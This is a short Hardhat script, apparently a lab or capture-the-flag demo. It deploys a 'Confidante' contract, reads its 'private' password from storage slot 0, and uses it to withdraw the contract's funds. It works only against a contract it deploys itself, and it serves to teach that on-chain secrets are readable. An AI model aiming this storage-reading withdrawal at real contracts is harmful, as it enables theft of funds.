import { ethers } from "hardhat";

async function main() {
    const confidanteFactory = await ethers.getContractFactory("Confidante");
    const confidanteContract = await confidanteFactory.deploy(ethers.utils.formatBytes32String("password"),
        { value: 1 });

    const oldBalance = await ethers.provider.getBalance(confidanteContract.address);
    console.log("oldBalance:", oldBalance.toString());

    const password = await ethers.provider.getStorageAt(confidanteContract.address, 0);
    await confidanteContract.withdraw(password);

    const newBalance = await ethers.provider.getBalance(confidanteContract.address);
    console.log("newBalance:", newBalance.toString());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
